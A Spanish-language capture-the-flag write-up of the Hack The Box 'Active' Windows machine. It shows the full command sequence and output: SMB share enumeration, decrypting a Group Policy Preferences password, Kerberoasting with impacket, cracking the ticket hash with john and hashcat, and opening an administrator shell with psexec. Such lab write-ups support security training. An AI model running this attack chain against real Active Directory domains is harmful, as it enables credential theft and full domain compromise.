---
title: Active - WriteUp
date: 'Sun, 08 Sep 2024 00:00:00 GMT'
categories: [WriteUps, HTB, Windows]
tags: [active-directory, smb, gpp, kerberoasting, crackmapexec, impacket, htb, ctf, windows, gpp-decrypt]
image: /assets/img/cabeceras/2024-09-08-ACTIVE-WRITEUP.png
description: >-
  Active es una máquina de dificultad fácil a media, que cuenta con dos técnicas
  muy frecuentes para obtener privilegios dentro de un entorno de Active
  Directory.
---

{% include machine-info.html
  machine="Active"
  os="Windows"
  difficulty="Easy"
  platform="HTB"
%}

![Active](/assets/img/htb-writeups/Pasted-image-20240226101504.png)

Active es una máquina de dificultad fácil a media, que presenta dos técnicas muy frecuentes para obtener privilegios dentro de un entorno de Active Directory.

## Enumeración

### NMAP

```bash
# Nmap 7.94SVN scan initiated Mon Feb 26 10:14:01 2024 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49173,49174 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.101.177
Nmap scan report for 10.129.101.177
Host is up (0.041s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-26 09:14:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Registramos `active.htb` en `/etc/hosts`.

### Enumeración SMB

```bash
crackmapexec smb 10.129.101.177 -u '' -p '' --shares

SMB         10.129.101.177  445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True)
SMB         10.129.101.177  445    DC               [+] active.htb\:
SMB         10.129.101.177  445    DC               [+] Enumerated shares
SMB         10.129.101.177  445    DC               Share           Permissions     Remark
SMB         10.129.101.177  445    DC               -----           -----------     ------
SMB         10.129.101.177  445    DC               ADMIN$                          Remote Admin
SMB         10.129.101.177  445    DC               C$                              Default share
SMB         10.129.101.177  445    DC               IPC$                            Remote IPC
SMB         10.129.101.177  445    DC               NETLOGON                        Logon server share
SMB         10.129.101.177  445    DC               Replication     READ
SMB         10.129.101.177  445    DC               SYSVOL                          Logon server share
SMB         10.129.101.177  445    DC               Users
```

Vemos que tenemos acceso al recurso compartido "Replication". Vamos a conectarnos a él con `smbclient`, cuando nos pida password pulsaremos intro.

```bash
$ smbclient //10.129.210.170/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

Ahora nos vamos a descargar todo el contenido:

```bash
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

## Explotación - GPP Password

Una vez descargado todo procedemos a inspeccionar los archivos uno a uno para ver si encontramos algo de valor.

![Groups.xml location](/assets/img/htb-writeups/Pasted-image-20240226113859.png)

Editamos `Groups.xml` indicado arriba y vemos que contiene un nombre usuario y una contraseña cifrada.

![Groups.xml content](/assets/img/htb-writeups/Pasted-image-20240226114918.png)

```
user=SVC_TGS
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

> **Nota:** Las Preferencias de Política de Grupo (GPP) se introdujeron en Windows Server 2008 y, entre muchas otras características, permitieron a los administradores modificar usuarios y grupos en su red. La contraseña definida estaba cifrada con AES-256 y almacenada en Groups.xml. Sin embargo, en algún momento de 2012, Microsoft publicó la clave AES en MSDN, lo que significa que las contraseñas establecidas mediante GPP ahora son triviales de descifrar.

Vamos a descifrar la contraseña:

```bash
$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Tenemos las credenciales:

```
SVC_TGS:GPPstillStandingStrong2k18
```

## Escalada de Privilegios - Kerberoasting

Comprobamos las nuevas credenciales con `crackmapexec`:

```bash
$ crackmapexec smb 10.129.210.170 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares

SMB         10.129.210.170  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.129.210.170  445    DC               [+] Enumerated shares
SMB         10.129.210.170  445    DC               Share           Permissions     Remark
SMB         10.129.210.170  445    DC               Users           READ
```

Ahora tenemos acceso de lectura a más recursos compartidos. Vamos a comprobar si el usuario es kerberoasteable:

```bash
$ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
```

![GetUserSPNs](/assets/img/htb-writeups/Pasted-image-20240226123120.png)

Y vemos que es el usuario Administrador! Vamos a solicitar el HASH para un TGS:

```bash
$ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
```

![TGS Hash](/assets/img/htb-writeups/Pasted-image-20240226123233.png)

Éxito! Copiamos el hash en un archivo y procedemos a desencriptar la contraseña con `john`:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-kerberos

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
'Ticketmaster1968' (?)
1g 0:00:00:06 DONE (2024-02-26 12:33) 0.1545g/s 1628Kp/s 1628Kc/s 1628KC/s Tiffani1432..Thrash1
Session completed.
```

También la podemos romper con `hashcat`:

```bash
$ hashcat -m 13100 hash-kerberos /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

Credenciales de Administrador:

```
Administrator:Ticketmaster1968
```

## Acceso como Administrator

Ahora que tenemos la contraseña de Administrador vamos a conseguir una consola remota:

```bash
$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.210.170
# o
$ impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.210.170
```

![Admin shell](/assets/img/htb-writeups/Pasted-image-20240226124206.png)

Máquina comprometida!

## Notas Adicionales

Si queremos obtener una lista de usuarios una vez obtenemos las primeras credenciales:

```bash
$ impacket-GetADUsers -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.210.170

Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40  2024-02-26 12:38:14
Guest                                                 <never>              <never>
krbtgt                                                2018-07-18 20:50:36  <never>
SVC_TGS                                               2018-07-18 22:14:38  2024-02-26 13:00:09
```

---

**Última actualización**: 2024-09-08<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
